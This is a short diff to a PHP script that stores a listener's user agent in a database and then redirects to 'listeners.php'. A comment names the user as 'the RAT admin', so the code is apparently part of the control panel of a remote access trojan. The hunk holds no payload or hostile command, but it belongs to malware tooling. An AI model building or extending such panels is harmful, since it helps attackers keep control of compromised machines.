@@ -32,4 +32,9 @@
     $statement->bindValue(":user_agent", $user_agent);
     $statement->execute();
     $statement->connection = null;
+
+    # Redirects user back to "listeners.php"
+    header("Location: listeners.php");
+
+    # TO DO: Add in success alert so the RAT admin knows the listener was created
 ?>
